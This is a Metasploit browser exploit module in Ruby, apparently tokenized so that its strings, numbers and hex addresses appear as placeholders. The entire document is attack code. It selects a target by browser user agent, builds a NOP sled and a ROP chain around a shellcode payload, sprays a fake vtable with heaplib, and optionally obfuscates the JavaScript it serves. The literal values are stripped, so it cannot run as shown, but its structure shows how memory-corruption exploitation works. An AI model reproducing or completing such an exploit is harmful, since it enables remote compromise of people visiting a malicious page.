require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Exploit :: RopDb def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , <str> = > <str> } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> } , <str> = > <str> , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > false , <str> = > nil , <str> = > <hex> , <str> = > <str> , <str> = > <str> , } ] , [ <str> , { <str> = > false , <str> = > nil , <str> = > <hex> , <str> = > <str> , <str> = > <str> , } ] , [ <str> , { <str> = > true , <str> = > <hex> , <str> = > <hex> , <str> = > <str> , <str> = > <str> , } ] , [ <str> , { <str> = > true , <str> = > <hex> , <str> = > <hex> , <str> = > <str> , <str> = > <str> , } ] , [ <str> , { } ] , ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptBool . new ( <str> , [ false , <str> , false ] ) ] , self . class ) end def auto_target ( cli , request ) agent = request . headers [ <str> ] if agent =~ <str> and agent =~ <str> mytarget = targets [ <int> ] elsif agent =~ <str> and agent =~ <str> mytarget = targets [ <int> ] elsif agent =~ <str> and agent =~ <str> mytarget = targets [ <int> ] elsif agent =~ <str> and agent =~ <str> mytarget = targets [ <int> ] else mytarget = nil end return mytarget end def on_request_uri ( cli , request ) mytarget = target debug = false if target . name == <str> mytarget = auto_target ( cli , request ) if mytarget . nil? agent = request . headers [ <str> ] print_error ( <str> agent <str> ) send_not_found ( cli ) return end elsif target . name =~ <str> debug = true end if debug data = <<- <str> DATA <str> <str> DATA print_status ( <str> mytarget . name <str> ) send_response ( cli , data , { <str> = > <str> } ) return end if mytarget [ <str> ] p = make_nops ( <int> ) p << <str> p << [ mytarget . ret ] . pack ( <str> ) p << payload . encoded rop_payload = generate_rop_payload ( <str> , p ) end code = ( rop_payload ) ? rop_payload : payload . encoded vtable = [ mytarget [ <str> ] ] . pack ( <str> ) code_js = Rex :: Text . to_unescape ( code , Rex :: Arch . endian ( target . arch ) ) vtable_js = Rex :: Text . to_unescape ( vtable , Rex :: Arch . endian ( target . arch ) ) if mytarget . name == <str> js_extract_str = <str> elsif mytarget . name == <str> js_extract_str = <str> else js_extract_str = <str> end js = <<- <str> JS <str> <str> JS js = heaplib ( js , { <str> = > true } ) if datastore [ <str> ] js = :: Rex :: Exploitation :: JSObfu . new ( js ) js . obfuscate end html = <<- <str> HTML <str> <str> HTML print_status ( <str> mytarget . name <str> ) send_response ( cli , html , { <str> = > <str> } ) end end 
